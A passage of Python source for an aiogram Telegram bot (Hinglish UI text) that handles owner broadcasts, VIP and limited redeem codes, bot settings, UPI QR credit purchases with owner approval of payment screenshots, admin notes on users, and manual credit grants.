    global CACHED_DEVICES, FB_DEVICE_COUNTS
    CACHED_DEVICES = [dev for dev in CACHED_DEVICES if dev.get("fb_id") != fb_id]
    FB_DEVICE_COUNTS.pop(fb_id, None)
    await cq.answer("🗑 Removed!")
    await owner_fb_menu(cq, state)

# ═══════════════════════════════════════════════════════════════
# ║  BROADCAST — Text/Image/Video/Audio/Doc + Caption
# ═══════════════════════════════════════════════════════════════
@R.callback_query(F.data.in_({"owner:broadcast", "admin:broadcast"}))
async def panel_broadcast_start(cq: CallbackQuery, state: FSMContext):
    d = load()
    if not is_admin(cq.from_user.id, d):
        await cq.answer("🚫 Access Denied!", show_alert=True)
        return
    await state.set_state(S.broadcast)
    back = "owner:home" if is_owner(cq.from_user.id, d) else "admin:home"
    await cq.message.edit_text(
        f"{em(EMOJI_BELL, '📢')} <b>Broadcast</b>\n\n"
        f"Koi bhi content bhejiye:\n"
        f"• 📝 Text\n"
        f"• 🖼 Photo + Caption\n"
        f"• 🎥 Video + Caption\n"
        f"• 🎵 Audio + Caption\n"
        f"• 📄 Document + Caption\n\n"
        f"Sabhi users ko forward hoga.",
        reply_markup=kb([(f"{sc('cancel')}", back)]),
        parse_mode="HTML"
    )

@R.message(S.broadcast)
async def panel_broadcast_do(msg: Message, state: FSMContext):
    d = load()
    uid = msg.from_user.id
    if not is_admin(uid, d):
        await state.clear()
        return
    await state.clear()
    users = list(d.get("users", {}).keys())
    if not users:
        await msg.answer(f"{em(EMOJI_CROSS, '❌')} No users!", parse_mode="HTML")
        return
    
    wait = await msg.answer(
        f"{em(EMOJI_BELL, '📤')} Broadcasting to <b>{len(users)}</b>...",
        parse_mode="HTML"
    )
    ok = fail = 0
    delay = 0.05
    for uid_str in users:
        try:
            target = int(uid_str)
            await msg.copy_to(target)
            ok += 1
        except TelegramRetryAfter as e:
            await asyncio.sleep(e.retry_after)
            try:
                await msg.copy_to(int(uid_str))
                ok += 1
            except:
                fail += 1
        except Exception:
            fail += 1
        await asyncio.sleep(delay)
    
    back_kb = owner_kb(d) if is_owner(uid, d) else admin_kb(d)
    await wait.edit_text(
        f"{em(EMOJI_CHECK, '✅')} <b>Broadcast Done!</b>\n\n"
        f"{em(EMOJI_CHECK, '✅')} Delivered: <b>{ok}</b>\n"
        f"{em(EMOJI_CROSS, '❌')} Failed: <b>{fail}</b>\n"
        f"{em(EMOJI_STAR, '📊')} Total: <b>{len(users)}</b>",
        reply_markup=back_kb,
        parse_mode="HTML"
    )
    log_activity(d, "broadcast", uid, f"ok={ok} fail={fail}")
    save(d)

# ═══════════════════════════════════════════════════════════════
# ║  REDEEM CODES — VIP (Infinite) + Normal (Limited)
# ═══════════════════════════════════════════════════════════════
@R.callback_query(F.data == "owner:redeem:menu")
async def owner_redeem_menu(cq: CallbackQuery, state: FSMContext):
    d = load()
    if not is_owner(cq.from_user.id, d):
        await cq.answer("🚫 Owner Only!", show_alert=True)
        return
    codes = d.get("redeem_codes", {})
    vip = [c for c, v in codes.items() if v.get("type") == "vip"]
    normal = [c for c, v in codes.items() if v.get("type") != "vip"]
    
    text = (
        f"{em(EMOJI_GIFT, '🎁')} <b>Redeem Codes</b>\n\n"
        f"{em(EMOJI_CROWN, '👑')} VIP Codes: <b>{len(vip)}</b> (∞ uses)\n"
        f"{em(EMOJI_STAR, '📦')} Normal Codes: <b>{len(normal)}</b> (limited)\n\n"
    )
    # Show top 10
    shown = 0
    for code, data in list(codes.items())[:10]:
        type_tag = f"{em(EMOJI_CROWN, '👑')} VIP" if data.get("type") == "vip" else f"{em(EMOJI_STAR, '📦')} NORMAL"
        uses_left = "∞" if data.get("type") == "vip" else data.get("uses_left", 0)
        status = "✅" if (data.get("type") == "vip" or data.get("uses_left", 0) > 0) else "❌"
        text += f"{status} <code>{code}</code> — {type_tag} — {em(EMOJI_MONEY, '💰')}{data['credits']} — uses: {uses_left}\n"
        shown += 1
    if len(codes) > shown:
        text += f"\n<i>+{len(codes) - shown} more...</i>"
    
    rows = [
        [btn("ɢᴇɴᴇʀᴀᴛᴇ ᴄᴏᴅᴇ", "owner:redeem:gen", EMOJI_CHECK, "➕", style="success")],
        [btn("ᴅᴇʟᴇᴛᴇ ᴄᴏᴅᴇ", "owner:redeem:del", EMOJI_CROSS, "🗑", style="danger")],
        [btn("ʙᴀᴄᴋ", "owner:home", EMOJI_GEAR, "🔙", style="primary")]
    ]
    await cq.message.edit_text(text, reply_markup=InlineKeyboardMarkup(inline_keyboard=rows), parse_mode="HTML")

@R.callback_query(F.data == "owner:redeem:gen")
async def owner_redeem_gen_start(cq: CallbackQuery, state: FSMContext):
    d = load()
    if not is_owner(cq.from_user.id, d):
        await cq.answer("🚫 Owner Only!", show_alert=True)
        return
    await state.set_state(S.gen_redeem_credits)
    await cq.message.edit_text(
        f"{em(EMOJI_GIFT, '🎁')} <b>Generate Redeem Code</b>\n\n"
        f"<b>Step 1/3:</b> Kitne credits? (e.g. 50)",
        reply_markup=kb([(f"{sc('cancel')}", "owner:redeem:menu")]),
        parse_mode="HTML"
    )

@R.message(S.gen_redeem_credits)
async def owner_redeem_credits(msg: Message, state: FSMContext):
    if not is_owner(msg.from_user.id, load()):
        await state.clear()
        return
    try:
        credits = int(msg.text.strip())
        if credits < 1: raise ValueError
        await state.update_data(gen_credits=credits)
    except:
        await msg.answer(f"{em(EMOJI_CROSS, '❌')} Valid number (≥1)!", parse_mode="HTML")
        return
    await state.set_state(S.gen_redeem_type)
    await msg.answer(
        f"{em(EMOJI_GIFT, '🎁')} <b>Step 2/3:</b> Type select karein",
        reply_markup=InlineKeyboardMarkup(inline_keyboard=[
            [btn("ᴠɪᴘ (∞ ᴜsᴇs)", "owner:redeem:type:vip", EMOJI_CROWN, "👑", style="success")],
            [btn("ɴᴏʀᴍᴀʟ (ʟɪᴍɪᴛᴇᴅ)", "owner:redeem:type:normal", EMOJI_STAR, "📦", style="primary")],
            [btn("ᴄᴀɴᴄᴇʟ", "owner:redeem:menu", EMOJI_CROSS, "❌", style="danger")]
        ]),
        parse_mode="HTML"
    )

@R.callback_query(F.data.in_({"owner:redeem:type:vip", "owner:redeem:type:normal"}))
async def owner_redeem_type_selected(cq: CallbackQuery, state: FSMContext):
    d = load()
    if not is_owner(cq.from_user.id, d):
        await cq.answer("🚫 Owner Only!", show_alert=True)
        return
    rtype = "vip" if "vip" in cq.data else "normal"
    await state.update_data(redeem_type=rtype)
    if rtype == "vip":
        # VIP — infinite, no uses prompt
        fsmd = await state.get_data()
        credits = fsmd.get("gen_credits", 10)
        code = "VIP" + "".join(random.choices(string.ascii_uppercase + string.digits, k=8))
        while code in d.get("redeem_codes", {}):
            code = "VIP" + "".join(random.choices(string.ascii_uppercase + string.digits, k=8))
        d.setdefault("redeem_codes", {})[code] = {
            "credits": credits,
            "uses_left": -1,  # -1 = infinite
            "type": "vip",
            "created_by": cq.from_user.id,
            "created_at": int(time.time()),
            "used_by": []
        }
        save(d)
        await state.clear()
        await cq.message.edit_text(
            f"{em(EMOJI_CROWN, '👑')} <b>VIP Code Generated!</b>\n\n"
            f"{em(EMOJI_GIFT, '🎁')} Code: <code>{code}</code>\n"
            f"{em(EMOJI_MONEY, '💰')} Credits: <b>{credits}</b>\n"
            f"{em(EMOJI_STAR, '♾')} Uses: <b>INFINITE</b>\n\n"
            f"<i>Yeh code jitni baar chaho use kar sakte hain.</i>",
            reply_markup=kb([(f"{sc('back')}", "owner:redeem:menu")]),
            parse_mode="HTML"
        )
        log_activity(d, "redeem_vip_created", cq.from_user.id, f"{code} credits={credits}")
        save(d)
    else:
        await state.set_state(S.gen_redeem_uses)
        await cq.message.edit_text(
            f"{em(EMOJI_STAR, '📦')} <b>Normal Code</b>\n\n"
            f"<b>Step 3/3:</b> Kitni baar use ho sakta hai?",
            reply_markup=kb([(f"{sc('cancel')}", "owner:redeem:menu")]),
            parse_mode="HTML"
        )

@R.message(S.gen_redeem_uses)
async def owner_redeem_uses(msg: Message, state: FSMContext):
    d = load()
    if not is_owner(msg.from_user.id, d):
        await state.clear()
        return
    try:
        uses = int(msg.text.strip())
        if uses < 1: raise ValueError
    except:
        await msg.answer(f"{em(EMOJI_CROSS, '❌')} Valid number (≥1)!", parse_mode="HTML")
        return
    fsmd = await state.get_data()
    credits = fsmd.get("gen_credits", 10)
    code = "GIFT" + "".join(random.choices(string.ascii_uppercase + string.digits, k=8))
    while code in d.get("redeem_codes", {}):
        code = "GIFT" + "".join(random.choices(string.ascii_uppercase + string.digits, k=8))
    d.setdefault("redeem_codes", {})[code] = {
        "credits": credits,
        "uses_left": uses,
        "type": "normal",
        "created_by": msg.from_user.id,
        "created_at": int(time.time()),
        "used_by": []
    }
    save(d)
    await state.clear()
    await msg.answer(
        f"{em(EMOJI_STAR, '📦')} <b>Normal Code Generated!</b>\n\n"
        f"{em(EMOJI_GIFT, '🎁')} Code: <code>{code}</code>\n"
        f"{em(EMOJI_MONEY, '💰')} Credits: <b>{credits}</b>\n"
        f"{em(EMOJI_STAR, '🔢')} Max Uses: <b>{uses}</b>",
        reply_markup=kb([(f"{sc('back')}", "owner:redeem:menu")]),
        parse_mode="HTML"
    )
    log_activity(d, "redeem_normal_created", msg.from_user.id, f"{code} credits={credits} uses={uses}")
    save(d)

@R.callback_query(F.data == "owner:redeem:del")
async def owner_redeem_del_menu(cq: CallbackQuery, state: FSMContext):
    d = load()
    if not is_owner(cq.from_user.id, d):
        await cq.answer("🚫 Owner Only!", show_alert=True)
        return
    codes = d.get("redeem_codes", {})
    if not codes:
        await cq.answer("❌ No codes!", show_alert=True)
        return
    rows = []
    for code in list(codes.keys())[:20]:
        rows.append([btn(code, f"owner:redeem:deldo:{code}", EMOJI_CROSS, "🗑", style="danger")])
    rows.append([btn("ʙᴀᴄᴋ", "owner:redeem:menu", EMOJI_GEAR, "🔙", style="primary")])
    await cq.message.edit_text(
        f"{em(EMOJI_CROSS, '🗑')} <b>Delete Code</b>",
        reply_markup=InlineKeyboardMarkup(inline_keyboard=rows),
        parse_mode="HTML"
    )

@R.callback_query(F.data.startswith("owner:redeem:deldo:"))
async def owner_redeem_del_do(cq: CallbackQuery, state: FSMContext):
    d = load()
    if not is_owner(cq.from_user.id, d):
        await cq.answer("🚫 Owner Only!", show_alert=True)
        return
    code = cq.data.split("owner:redeem:deldo:", 1)[1]
    if code in d.get("redeem_codes", {}):
        del d["redeem_codes"][code]
        save(d)
    await cq.answer("🗑 Deleted!")
    await owner_redeem_menu(cq, state)

@R.callback_query(F.data == "user:redeem")
async def user_redeem_start(cq: CallbackQuery, state: FSMContext):
    await state.set_state(S.redeem_code)
    await cq.message.edit_text(
        f"{em(EMOJI_GIFT, '🎁')} <b>Redeem Code</b>\n\nApna code enter karein:",
        reply_markup=kb([(f"{sc('cancel')}", "user:home")]),
        parse_mode="HTML"
    )

@R.message(S.redeem_code)
async def user_redeem_done(msg: Message, state: FSMContext):
    d = load()
    uid = msg.from_user.id
    code = msg.text.strip().upper()
    await state.clear()
    codes = d.get("redeem_codes", {})
    if code not in codes:
        await msg.answer(f"{em(EMOJI_CROSS, '❌')} Invalid code!", reply_markup=kb([(f"{sc('home')}", "user:home")]), parse_mode="HTML")
        return
    data = codes[code]
    is_vip = data.get("type") == "vip"
    if not is_vip and data.get("uses_left", 0) <= 0:
        await msg.answer(f"{em(EMOJI_CROSS, '❌')} Code expired!", reply_markup=kb([(f"{sc('home')}", "user:home")]), parse_mode="HTML")
        return
    if is_vip and uid in data.get("used_by", []):
        # VIP — allow multiple times? Let's allow same user multiple times for VIP
        pass
    elif not is_vip and uid in data.get("used_by", []):
        await msg.answer(f"{em(EMOJI_CROSS, '❌')} Aap pehle use kar chuke!", reply_markup=kb([(f"{sc('home')}", "user:home")]), parse_mode="HTML")
        return
    credits = data["credits"]
    add_credits(uid, credits, d)
    if not is_vip:
        data["uses_left"] = data.get("uses_left", 1) - 1
    data.setdefault("used_by", []).append(uid)
    save(d)
    await msg.answer(
        f"{em(EMOJI_GIFT, '🎉')} <b>Redeemed!</b>\n\n"
        f"{em(EMOJI_MONEY, '💰')} +{credits} credits\n"
        f"{em(EMOJI_MONEY, '💳')} Balance: <b>{get_user_credits(uid, d)}</b>",
        reply_markup=kb([(f"{sc('home')}", "user:home")]),
        parse_mode="HTML"
    )

# ═══════════════════════════════════════════════════════════════
# ║  SETTINGS — Welcome credits + Referral credits + UPI
# ═══════════════════════════════════════════════════════════════
@R.callback_query(F.data == "owner:settings")
async def owner_settings(cq: CallbackQuery, state: FSMContext):
    d = load()
    if not is_owner(cq.from_user.id, d):
        await cq.answer("🚫 Owner Only!", show_alert=True)
        return
    s = d.get("settings", {})
    text = (
        f"{em(EMOJI_GEAR, '⚙️')} <b>Bot Settings</b>\n\n"
        f"{em(EMOJI_GIFT, '🎁')} Welcome Credits: <b>{s.get('welcome_credits', 0)}</b>\n"
        f"{em(EMOJI_STAR, '🌟')} Referral Credits: <b>{s.get('ref_credits', 0)}</b>\n"
        f"{em(EMOJI_CROWN, '👑')} Max Owners: <b>{s.get('max_owners', 6)}</b>\n"
        f"{em(EMOJI_MONEY, '💳')} UPI ID: <code>{d.get('pricing', {}).get('upi_id', DEFAULT_UPI_ID)}</code>\n\n"
        f"<i>0 = disabled (no credits given)</i>"
    )
    rows = [
        [btn("sᴇᴛ ᴡᴇʟᴄᴏᴍᴇ ᴄʀᴇᴅɪᴛs", "owner:settings:welcome", EMOJI_GIFT, "🎁", style="success")],
        [btn("sᴇᴛ ʀᴇғᴇʀʀᴀʟ ᴄʀᴇᴅɪᴛs", "owner:settings:ref", EMOJI_STAR, "🌟", style="primary")],
        [btn("sᴇᴛ ᴜᴘɪ ɪᴅ", "owner:settings:upi", EMOJI_MONEY, "💳", style="success")],
        [btn("ʙᴀᴄᴋ", "owner:home", EMOJI_GEAR, "🔙", style="primary")]
    ]
    await cq.message.edit_text(text, reply_markup=InlineKeyboardMarkup(inline_keyboard=rows), parse_mode="HTML")

@R.callback_query(F.data == "owner:settings:welcome")
async def owner_settings_welcome(cq: CallbackQuery, state: FSMContext):
    if not is_owner(cq.from_user.id, load()):
        await cq.answer("🚫 Owner Only!", show_alert=True)
        return
    await state.set_state(S.set_welcome_credits)
    await cq.message.edit_text(
        f"{em(EMOJI_GIFT, '🎁')} <b>Welcome Credits</b>\n\n"
        f"Naye user ko /start par kitne credits milen?\n"
        f"<i>0 = disabled</i>",
        reply_markup=kb([(f"{sc('cancel')}", "owner:settings")]),
        parse_mode="HTML"
    )

@R.message(S.set_welcome_credits)
async def owner_settings_welcome_done(msg: Message, state: FSMContext):
    d = load()
    if not is_owner(msg.from_user.id, d):
        await state.clear()
        return
    try:
        credits = int(msg.text.strip())
        if credits < 0: raise ValueError
    except:
        await msg.answer(f"{em(EMOJI_CROSS, '❌')} Valid number (≥0)!", parse_mode="HTML")
        return
    d.setdefault("settings", {})["welcome_credits"] = credits
    save(d)
    await state.clear()
    await msg.answer(
        f"{em(EMOJI_CHECK, '✅')} Welcome credits set to <b>{credits}</b>!",
        reply_markup=kb([(f"{sc('back')}", "owner:settings")]),
        parse_mode="HTML"
    )

@R.callback_query(F.data == "owner:settings:ref")
async def owner_settings_ref(cq: CallbackQuery, state: FSMContext):
    if not is_owner(cq.from_user.id, load()):
        await cq.answer("🚫 Owner Only!", show_alert=True)
        return
    await state.set_state(S.set_ref_credits)
    await cq.message.edit_text(
        f"{em(EMOJI_STAR, '🌟')} <b>Referral Credits</b>\n\n"
        f"Per referral pe kitne credits?\n"
        f"<i>0 = disabled</i>",
        reply_markup=kb([(f"{sc('cancel')}", "owner:settings")]),
        parse_mode="HTML"
    )

@R.message(S.set_ref_credits)
async def owner_settings_ref_done(msg: Message, state: FSMContext):
    d = load()
    if not is_owner(msg.from_user.id, d):
        await state.clear()
        return
    try:
        credits = int(msg.text.strip())
        if credits < 0: raise ValueError
    except:
        await msg.answer(f"{em(EMOJI_CROSS, '❌')} Valid number (≥0)!", parse_mode="HTML")
        return
    d.setdefault("settings", {})["ref_credits"] = credits
    d.setdefault("premium", {})["ref_credits"] = credits
    save(d)
    await state.clear()
    await msg.answer(
        f"{em(EMOJI_CHECK, '✅')} Ref credits set to <b>{credits}</b>!",
        reply_markup=kb([(f"{sc('back')}", "owner:settings")]),
        parse_mode="HTML"
    )

@R.callback_query(F.data == "owner:settings:upi")
async def owner_settings_upi(cq: CallbackQuery, state: FSMContext):
    if not is_owner(cq.from_user.id, load()):
        await cq.answer("🚫 Owner Only!", show_alert=True)
        return
    await state.set_state(S.set_upi_id)
    await cq.message.edit_text(
        f"{em(EMOJI_MONEY, '💳')} <b>Set UPI ID</b>\n\n"
        f"UPI ID bhejo (e.g. <code>ayush@fam</code>):",
        reply_markup=kb([(f"{sc('cancel')}", "owner:settings")]),
        parse_mode="HTML"
    )

@R.message(S.set_upi_id)
async def owner_settings_upi_done(msg: Message, state: FSMContext):
    d = load()
    if not is_owner(msg.from_user.id, d):
        await state.clear()
        return
    upi = msg.text.strip()
    if "@" not in upi:
        await msg.answer(f"{em(EMOJI_CROSS, '❌')} Invalid UPI (must contain @)!", parse_mode="HTML")
        return
    d.setdefault("pricing", {})["upi_id"] = upi
    save(d)
    await state.clear()
    await msg.answer(
        f"{em(EMOJI_CHECK, '✅')} UPI set: <code>{upi}</code>",
        reply_markup=kb([(f"{sc('back')}", "owner:settings")]),
        parse_mode="HTML"
    )

# ═══════════════════════════════════════════════════════════════
# ║  BUY / DIRECT PURCHASE (UPI QR)
# ═══════════════════════════════════════════════════════════════
def buy_plans_kb(d: dict) -> InlineKeyboardMarkup:
    plans = d.get("pricing", {}).get("plans", [])
    rows = []
    for plan in plans:
        rows.append([btn(f"{plan['name']} — ₹{plan['price']} ({plan['credits']}c)", f"user:buy_plan:{plan['id']}", EMOJI_MONEY, "🛒", style="success")])
    rows.append([btn("ʙᴀᴄᴋ", "user:home", EMOJI_GEAR, "🔙", style="primary")])
    return InlineKeyboardMarkup(inline_keyboard=rows)

def generate_qr_url(text: str) -> str:
    return "https://api.qrserver.com/v1/create-qr-code/?size=400x400&data=" + quote(text, safe="")

@R.callback_query(F.data == "user:buy_menu")
async def user_buy_menu(cq: CallbackQuery, state: FSMContext):
    d = load()
    plans = d.get("pricing", {}).get("plans", [])
    if not plans:
        await cq.answer("❌ No plans available!", show_alert=True)
        return
    text = f"{em(EMOJI_MONEY, '🛒')} <b>Buy Credits</b>\n\n"
    for p in plans:
        text += f"{em(EMOJI_STAR, '📦')} <b>{p['name']}</b> — ₹{p['price']} = {p['credits']}c\n"
    await cq.message.edit_text(text, reply_markup=buy_plans_kb(d), parse_mode="HTML")

@R.callback_query(F.data.startswith("user:buy_plan:"))
async def user_buy_plan_selected(cq: CallbackQuery, state: FSMContext):
    d = load()
    plan_id = cq.data.split("user:buy_plan:", 1)[1]
    plan = next((p for p in d.get("pricing", {}).get("plans", []) if p["id"] == plan_id), None)
    if not plan:
        await cq.answer("❌ Not found!", show_alert=True)
        return
    upi_id = d.get("pricing", {}).get("upi_id", DEFAULT_UPI_ID)
    upi_name = d.get("pricing", {}).get("upi_name", DEFAULT_UPI_NAME)
    amount = plan["price"]
    upi_uri = f"upi://pay?pa={quote(upi_id)}&pn={quote(upi_name)}&am={amount}&cu=INR&tn={quote('Credits ' + str(plan['credits']))}"
    qr_url = generate_qr_url(upi_uri)
    req_id = "BUY" + str(int(time.time())) + str(random.randint(100, 999))
    d.setdefault("buy_requests", {})[req_id] = {
        "req_id": req_id, "user_id": cq.from_user.id, "plan_id": plan["id"],
        "plan_name": plan["name"], "price": plan["price"], "credits": plan["credits"],
        "created_at": int(time.time()), "status": "pending"
    }
    save(d)
    text = (
        f"{em(EMOJI_MONEY, '💳')} <b>Pay ₹{amount} for {plan['credits']} Credits</b>\n\n"
        f"{em(EMOJI_LOCK, '🏦')} UPI: <code>{upi_id}</code>\n"
        f"{em(EMOJI_GEAR, '📝')} Ref: <code>{req_id}</code>\n\n"
        f"QR scan karein ya UPI par pay karein.\n"
        f"<b>Screenshot bhejein payment ka.</b>"
    )
    await cq.message.answer_photo(
        photo=qr_url, caption=text,
        reply_markup=kb([(f"{sc('cancel')}", "user:home")]),
        parse_mode="HTML"
    )
    await state.set_state(S.buy_ss)
    await state.update_data(buy_req_id=req_id)
    await cq.answer("📸 Send screenshot")

@R.message(S.buy_ss, F.photo)
async def user_buy_ss_received(msg: Message, state: FSMContext):
    fsmd = await state.get_data()
    req_id = fsmd.get("buy_req_id")
    d = load()
    req = d.get("buy_requests", {}).get(req_id)
    if not req or req.get("status") != "pending":
        await msg.answer(f"{em(EMOJI_CROSS, '❌')} Invalid request!", reply_markup=kb([(f"{sc('home')}", "user:home")]), parse_mode="HTML")
        await state.clear()
        return
    req["screenshot_file_id"] = msg.photo[-1].file_id
    req["screenshot_at"] = int(time.time())
    save(d)
    caption = (
        f"{em(EMOJI_MONEY, '💸')} <b>NEW BUY REQUEST</b>\n\n"
        f"{em(EMOJI_STAR, '🆔')} <code>{req_id}</code>\n"
        f"{em(EMOJI_STAR, '📦')} {req['plan_name']}\n"
        f"{em(EMOJI_MONEY, '💰')} ₹{req['price']}\n"
        f"{em(EMOJI_GIFT, '🎁')} {req['credits']}c\n"
        f"{em(EMOJI_PHONE, '👤')} <code>{req['user_id']}</code>"
    )
    markup = InlineKeyboardMarkup(inline_keyboard=[[
        InlineKeyboardButton(text="✅ Approve", callback_data=f"owner:buy:approve:{req_id}"),
        InlineKeyboardButton(text="❌ Reject", callback_data=f"owner:buy:reject:{req_id}")
    ]])
    for oid in d.get("owners", [MAIN_OWNER]):
        try:
            await msg.bot.send_photo(oid, photo=req["screenshot_file_id"], caption=caption, reply_markup=markup, parse_mode="HTML")
        except: pass
    await msg.answer(
        f"{em(EMOJI_CHECK, '✅')} Screenshot received! Owner verify karega.",
        reply_markup=kb([(f"{sc('home')}", "user:home")]),
        parse_mode="HTML"
    )
    await state.clear()

@R.message(S.buy_ss)
async def user_buy_ss_invalid(msg: Message):
    await msg.answer(f"{em(EMOJI_CROSS, '❌')} Screenshot (photo) bhejein!", parse_mode="HTML")

@R.callback_query(F.data == "owner:buy:pending")
async def owner_buy_pending(cq: CallbackQuery, state: FSMContext):
    d = load()
    if not is_owner(cq.from_user.id, d):
        await cq.answer("🚫 Owner Only!", show_alert=True)
        return
    pending = [(rid, r) for rid, r in d.get("buy_requests", {}).items() if r.get("status") == "pending"]
    if not pending:
        await cq.message.edit_text(
            f"{em(EMOJI_MONEY, '🛒')} <b>Pending Buys</b>\n\n✅ None pending.",
            reply_markup=kb([(f"{sc('back')}", "owner:home")]),
            parse_mode="HTML"
        )
        return
    text = f"{em(EMOJI_MONEY, '🛒')} <b>Pending ({len(pending)})</b>\n\n"
    for rid, r in pending[-10:]:
        text += f"{em(EMOJI_STAR, '🆔')} <code>{rid}</code> — 👤{r['user_id']} | {r['plan_name']} | ₹{r['price']}\n"
    rows = []
    for rid, r in pending[-10:]:
        rows.append([
            InlineKeyboardButton(text=f"✅ {rid[-8:]}", callback_data=f"owner:buy:approve:{rid}"),
            InlineKeyboardButton(text=f"❌ {rid[-8:]}", callback_data=f"owner:buy:reject:{rid}")
        ])
    rows.append([InlineKeyboardButton(text="🔙 Back", callback_data="owner:home")])
    await cq.message.edit_text(text, reply_markup=InlineKeyboardMarkup(inline_keyboard=rows), parse_mode="HTML")

@R.callback_query(F.data.startswith("owner:buy:approve:"))
async def owner_buy_approve(cq: CallbackQuery, state: FSMContext):
    d = load()
    if not is_owner(cq.from_user.id, d):
        await cq.answer("🚫 Owner Only!", show_alert=True)
        return
    req_id = cq.data.split("owner:buy:approve:", 1)[1]
    req = d.get("buy_requests", {}).get(req_id)
    if not req or req.get("status") != "pending":
        await cq.answer("❌ Invalid/already processed!", show_alert=True)
        return
    user_id = req["user_id"]
    credits = int(req["credits"])
    add_credits(user_id, credits, d)
    req["status"] = "approved"
    req["approved_at"] = int(time.time())
    save(d)
    log_activity(d, "buy_approved", cq.from_user.id, f"{req_id} user={user_id} +{credits}c")
    save(d)
    await cq.answer("✅ Approved!")
    try:
        await cq.bot.send_message(
            user_id,
            f"{em(EMOJI_GIFT, '🎉')} <b>Payment Approved!</b>\n\n"
            f"{em(EMOJI_MONEY, '💰')} +{credits} credits\n"
            f"{em(EMOJI_MONEY, '💳')} Balance: <b>{get_user_credits(user_id, d)}</b>",
            parse_mode="HTML"
        )
    except: pass

@R.callback_query(F.data.startswith("owner:buy:reject:"))
async def owner_buy_reject(cq: CallbackQuery, state: FSMContext):
    d = load()
    if not is_owner(cq.from_user.id, d):
        await cq.answer("🚫 Owner Only!", show_alert=True)
        return
    req_id = cq.data.split("owner:buy:reject:", 1)[1]
    req = d.get("buy_requests", {}).get(req_id)
    if not req or req.get("status") != "pending":
        await cq.answer("❌ Invalid!", show_alert=True)
        return
    req["status"] = "rejected"
    req["rejected_at"] = int(time.time())
    save(d)
    await cq.answer("❌ Rejected!")
    try:
        await cq.bot.send_message(
            req["user_id"],
            f"{em(EMOJI_CROSS, '❌')} <b>Payment Rejected</b>\n\nContact: {SUPER_ADMIN_NAME}",
            parse_mode="HTML"
        )
    except: pass

# ═══════════════════════════════════════════════════════════════
# ║  ADMIN EXTRA FEATURES — NOTES + STATS
# ═══════════════════════════════════════════════════════════════
@R.callback_query(F.data == "admin:notes:menu")
async def admin_notes_menu(cq: CallbackQuery, state: FSMContext):
    d = load()
    if not is_admin(cq.from_user.id, d):
        await cq.answer("🚫 Admin only!", show_alert=True)
        return
    notes = d.get("admin_notes", {})
    my_notes = [n for n in notes.values() if n.get("author") == cq.from_user.id]
    text = (
        f"{em(EMOJI_GEAR, '📝')} <b>Admin Notes</b>\n\n"
        f"{em(EMOJI_STAR, '📊')} Total Notes: <b>{len(notes)}</b>\n"
        f"{em(EMOJI_PHONE, '👤')} Your Notes: <b>{len(my_notes)}</b>\n\n"
    )
    for n in list(my_notes)[:5]:
        text += f"• <code>{n['target_uid']}</code>: {(n.get('text') or '')[:40]}\n"
    rows = [
        [btn("ᴀᴅᴅ ɴᴏᴛᴇ", "admin:notes:add", EMOJI_CHECK, "➕", style="success")],
        [btn("ʙᴀᴄᴋ", "admin:home", EMOJI_GEAR, "🔙", style="primary")]
    ]
    await cq.message.edit_text(text, reply_markup=InlineKeyboardMarkup(inline_keyboard=rows), parse_mode="HTML")

@R.callback_query(F.data == "admin:notes:add")
async def admin_notes_add(cq: CallbackQuery, state: FSMContext):
    d = load()
    if not is_admin(cq.from_user.id, d):
        await cq.answer("🚫 Admin only!", show_alert=True)
        return
    await state.set_state(S.admin_note_uid)
    await cq.message.edit_text(
        f"{em(EMOJI_GEAR, '📝')} <b>Add Note</b>\n\nUser ID bhejo:",
        reply_markup=kb([(f"{sc('cancel')}", "admin:home")]),
        parse_mode="HTML"
    )

@R.message(S.admin_note_uid)
async def admin_notes_uid(msg: Message, state: FSMContext):
    try:
        target_uid = int(msg.text.strip())
    except:
        await msg.answer(f"{em(EMOJI_CROSS, '❌')} Valid ID!", parse_mode="HTML")
        return
    await state.update_data(note_target=target_uid)
    await state.set_state(S.admin_note_text)
    await msg.answer(
        f"{em(EMOJI_GEAR, '📝')} Note text bhejo (for user <code>{target_uid}</code>):",
        reply_markup=kb([(f"{sc('cancel')}", "admin:home")]),
        parse_mode="HTML"
    )

@R.message(S.admin_note_text)
async def admin_notes_text(msg: Message, state: FSMContext):
    d = load()
    if not is_admin(msg.from_user.id, d):
        await state.clear()
        return
    fsmd = await state.get_data()
    target_uid = fsmd.get("note_target")
    note_id = str(int(time.time()))
    d.setdefault("admin_notes", {})[note_id] = {
        "target_uid": target_uid,
        "text": msg.text.strip(),
        "author": msg.from_user.id,
        "created_at": int(time.time())
    }
    save(d)
    await state.clear()
    await msg.answer(
        f"{em(EMOJI_CHECK, '✅')} Note added for <code>{target_uid}</code>!",
        reply_markup=kb([(f"{sc('back')}", "admin:home")]),
        parse_mode="HTML"
    )

# ═══════════════════════════════════════════════════════════════
# ║  CREDITS ADD/DEDUCT (single + all)
# ═══════════════════════════════════════════════════════════════
@R.callback_query(F.data == "owner:credits:add")
async def owner_credits_add_start(cq: CallbackQuery, state: FSMContext):
    if not is_owner(cq.from_user.id, load()):
        await cq.answer("🚫 Owner Only!", show_alert=True)
        return
    await state.set_state(S.add_credits_uid)
    await cq.message.edit_text(
        f"{em(EMOJI_MONEY, '💰')} <b>Add Credits</b>\n\nUser ID:",
        reply_markup=kb([(f"{sc('cancel')}", "owner:home")]),
        parse_mode="HTML"
    )

@R.message(S.add_credits_uid)
async def owner_credits_add_uid(msg: Message, state: FSMContext):
    if not is_owner(msg.from_user.id, load()):
        await state.clear()
        return
    try:
        uid = int(msg.text.strip())
        await state.update_data(credit_uid=uid)
    except:
        await msg.answer(f"{em(EMOJI_CROSS, '❌')} Valid ID!", parse_mode="HTML")
        return
    await state.set_state(S.add_credits_amount)
    await msg.answer(
        f"{em(EMOJI_MONEY, '💰')} Amount?",
        reply_markup=kb([(f"{sc('cancel')}", "owner:home")]),
        parse_mode="HTML"
    )

@R.message(S.add_credits_amount)
async def owner_credits_add_amount(msg: Message, state: FSMContext):
    d = load()
    if not is_owner(msg.from_user.id, d):
        await state.clear()
        return
    try:
        amount = int(msg.text.strip())
        if amount < 1: raise ValueError
    except:
        await msg.answer(f"{em(EMOJI_CROSS, '❌')} Valid number!", parse_mode="HTML")
        return
    fsmd = await state.get_data()
    uid = fsmd.get("credit_uid")
    add_credits(uid, amount, d)
    save(d)
    await state.clear()
    try:
        await msg.bot.send_message(uid, f"{em(EMOJI_MONEY, '💰')} +{amount} credits added!", parse_mode="HTML")
    except: pass
    await msg.answer(
